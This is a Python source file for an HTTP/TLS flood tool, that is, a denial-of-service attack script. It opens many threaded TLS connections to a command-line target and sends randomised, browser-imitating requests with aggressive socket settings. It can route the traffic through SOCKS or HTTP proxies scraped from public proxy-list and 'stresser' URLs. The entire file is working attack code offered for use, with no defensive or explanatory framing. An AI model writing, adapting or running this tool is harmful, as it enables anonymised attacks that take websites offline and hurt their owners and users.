import socks, socket, requests, ssl, random, struct, threading, os, re
from MODEL.data import get_target, generate_url_path, random_useragent, same_random, get_command, header_random,read

def PaKT(meth, pth, target, ssl_socket, mode):
    if mode['END'] == '2':
     ender =  "".join([random.choice(('\n','\r')) for _ in range(random.choice((1,2)))])
    elif mode['END'] == '1':ender = '\r\n'
    else: ender = mode['END'].replace("\\n", "\n").replace("\\r", "\r")
    head = same_random(ender)

    if mode['END2'] == '0':ender2 = ender * 4 if len(ender) == 1 else ender * 2
    else:ender2 = mode['END2'].replace("\\n", "\n").replace("\\r", "\r")
    a = random_useragent()
    header_base = f"User-Agent: {a}{ender2}"

    if mode['HEADER'] == '1':
        header_base = f"User-Agent: {a}{ender}{header_random(mode['TOTAL'], mode['LENGTH'])}{ender2}"
    
    common_headers = ''.join(filter(None,(
        head[0],head[1],head[2],head[3],
        f"Connection: Keep-Alive{ender}",
        head[4],
        f"Cache-Control: max-age=0{ender}"
        f"Pragma: no-cache{ender}"
        f"Origin: {target['scheme']}://{target['host']}{ender}",
        head[5],
        f"Host: {target['host']}{ender}"
        f"Sec-Ch-Ua: 'Not_A Brand';v='8', 'Chromium';v='120', 'Microsoft Edge';v='120'{ender}",
        head[6],head[7],head[8],head[9],head[10],head[11],
        f"Sec-GPC: 1{ender}"
        f"Sec-Fetch-User: ?1{ender}"
        f"DNT: 1{ender}"
        f"X-Requested-With: XMLHttpRequest{ender}"
        f"Upgrade-Insecure-Requests: 1{ender}"
        f"TE: compress, deflate, gzip, trailers{ender}",
        header_base
    )))
    
    pta = '/' if mode['PATH'] == '' else mode['PATH']

    p = [
        f"{meth} {pta}{a} HTTP/1.1{ender}{common_headers}".encode()
        for a in pth
    ]
    threading.Thread(target=browser_send,args=(ssl_socket,p,mode)).start()

def SET(s,type,ip):
  if type == '3':s.set_proxy(socks.HTTP, ip[0], int(ip[1]))
  elif type == '2':s.set_proxy(socks.SOCKS5, ip[0], int(ip[1]))
  elif type == '1':s.set_proxy(socks.SOCKS4, ip[0], int(ip[1]))
   
def PROXY_GET(mode, type, rand, times, methods, target,mode3):
    test = rand.replace('https://','').split('/')

    if test[0] == 'raw' and test[3] in ['B4RC0DE-TM', 'TheSpeedX', 'prxchk']:mode = 'http' if mode.lower() == 'https' else mode
    elif test[0] == 'www.stresserlist.com' and mode.lower() == 'https':mode = 'http'

    try:
        r = requests.get(rand%(mode))
        if r.status_code != 429:
         r = r.content.decode()
         for proxy in r.split('\n'):
          if read() == True:break
          ip = proxy.split(':')
          s = socks.socksocket()
          SET(s,type,ip)
          threading.Thread(target=browser,args=(target, methods, times, type, proxy,mode,mode3)).start()
    except:pass

def browser_send(ssl_socket,byt,mode):
   try:
    ssl_socket.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER,struct.pack('ii', 0, 1))
    for _ in range(500):
     if read() == True:break
     if mode['SENDER'] == '1': 
      for by in byt:
       if read() == True:break
       ssl_socket.write(by); ssl_socket.sendall(by); ssl_socket.send(by)
       if mode['RESET'] == '1':
        ssl_socket.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER,struct.pack('ii', 0, 1))
     else:
        ssl_socket.write(byt[0]); ssl_socket.sendall(byt[0]); ssl_socket.send(byt[0])
        if mode['RESET'] == '1':ssl_socket.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER,struct.pack('ii', 0, 1))
        ssl_socket.write(byt[1]); ssl_socket.sendall(byt[1]); ssl_socket.send(byt[1])
        if mode['RESET'] == '1':ssl_socket.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER,struct.pack('ii', 0, 1))
    ssl_socket.shutdown(socket.SHUT_RDWR)
    ssl_socket.close()
   except:pass

def browser(target, methods, duration_sec_attack_dude, type,ip2,proxy_mode,mode3):
    path = 1
    for _ in range(int(duration_sec_attack_dude)):
        if read() == True:break
        try:
            for _ in range(500):
                if proxy_mode == 'None':
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_TCP)
                else:
                    s = socks.socksocket()
                    ip = ip2.split(':')
                    SET(s,type,ip)
                if mode3['OPTSOCKET'] == '1':
                 s.setblocking(1); s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1); s.setsockopt(socket.IPPROTO_TCP, socket.TCP_FASTOPEN, 5); s.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPIDLE, 300); s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1); s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1); s.setsockopt(socket.IPPROTO_IP, socket.IP_TTL, 255); s.setsockopt(socket.IPPROTO_IP, socket.IP_TOS, 63); s.setsockopt(socket.SOL_SOCKET, socket.SO_OOBINLINE, 1)
                s.connect((str(target['host']),int(target['port']))); s.connect_ex((str(target['host']),int(target['port'])))
                try:
                 ssl_socket = ssl.SSLContext(ssl.PROTOCOL_TLS,ssl.PROTOCOL_TLS_CLIENT,ssl.PROTOCOL_TLS_SERVER,ssl.PROTOCOL_TLSv1,ssl.PROTOCOL_TLSv1_1,ssl.PROTOCOL_TLSv1_2,ssl.PROTOCOL_SSLv23); ssl_socket.options |= ssl.OP_IGNORE_UNEXPECTED_EOF | ssl.OP_CIPHER_SERVER_PREFERENCE | ssl.OP_ENABLE_MIDDLEBOX_COMPAT | ssl.OP_SINGLE_DH_USE | ssl.OP_SINGLE_ECDH_USE | ssl.HAS_SSLv2 | ssl.HAS_SSLv3
                except:ssl_socket  = ssl.SSLContext()
                if mode3['CIPHER'] != '':ssl_socket.set_ciphers(mode3['CIPHER'])
                ssl_socket = ssl_socket.wrap_socket(s,server_hostname=target['host'])
                ssl_socket.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER,struct.pack('ii', 0, 1))
                ts = mode3['EXITS'] == '1'
                t = threading.Thread(target=PaKT,args=(methods, [generate_url_path(num=path),target['uri']], target,ssl_socket,mode3),daemon=ts);t.start()
                if mode3['SLOW'] == '1':t.join()
                path += 1
        except:
          path += 1
import sys 
c=0
try:
 target_url, times, thread, meth, proxy, mode, files = sys.argv[1], int(sys.argv[2]), int(sys.argv[3]), sys.argv[4], 'None', 'None','command.txt'

 if len(sys.argv) >= 6:proxy = sys.argv[5]
 if len(sys.argv) == 7:file = sys.argv[6]
 else:c=1
except:c=1
if c == 1: print(f'{sys.argv[0]} <LINK> <TIME> <THREAD> <METHODS-HTTP> [PROXY-TYPE] [COMMAND-FILES]\nPROXY-TYPE ONLY HTTP,HTTPS, SOCKS5, SOCKS4'); exit()
proxy_mapping = {'3': (3, 'http'), 'HTTPS': (3, 'https'), 'HTTP': (3, 'http'),
                 '2': (2, 'socks5'), 'SOCKS5': (2, 'socks5'),
                 '1': (1, 'socks4'), 'SOCKS4': (1, 'socks4'),
                 '0': (0, 'None'), 'None': (0, 'None')}
p, mode = proxy_mapping.get(proxy.upper(), (0, 'None'))
data =  re.sub(r'\d', '', os.path.basename(sys.argv[0]).replace('.',' ').split(' ')[0])
mode2 = get_command(files=os.path.join(os.getcwd()+'/methods/MODEL',files),meth=data)
print(f'FLOODING --> {p}/{mode}:{meth} TIME={times} THREAD={thread} {target_url} as {mode2["PATH"]}\n\nAttach Command --> {file}\n\n')
target = get_target(target_url)
if p != 0:
 links = ['https://www.proxy-list.download/api/v1/get?type=%s','https://raw.githubusercontent.com/casals-ar/proxy-list/main/%s','https://raw.githubusercontent.com/zloi-user/hideip.me/main/%s.txt','https://raw.githubusercontent.com/prxchk/proxy-list/main/%s.txt','https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/%s.txt','https://www.stresserlist.com/scripts/%s.txt','http://pubproxy.com/api/proxy?type=%s&referer=true&user_agent=true&cookies=true&format=txt&limit=5&https=true','http://pubproxy.com/api/proxy?type=%s&referer=true&user_agent=true&cookies=true&format=txt&limit=5','https://raw.githubusercontent.com/B4RC0DE-TM/proxy-list/main/%s.txt','https://proxyspace.pro/%s.txt','https://api.proxyscrape.com/?request=displayproxies&proxytype=%s&country=all','https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/%s.txt']
 for _ in range(thread):
   if read() == True:break
   for a in links:
       if read() == True:break
       threading.Thread(target=PROXY_GET,args=(mode, p, a, times, meth, target, mode2)).start()
else:
   for _ in range(thread):
       if read() == True:break
       threading.Thread(target=browser,args=(target, meth, times, p, '1.1.1.1', 'None', mode2)).start()
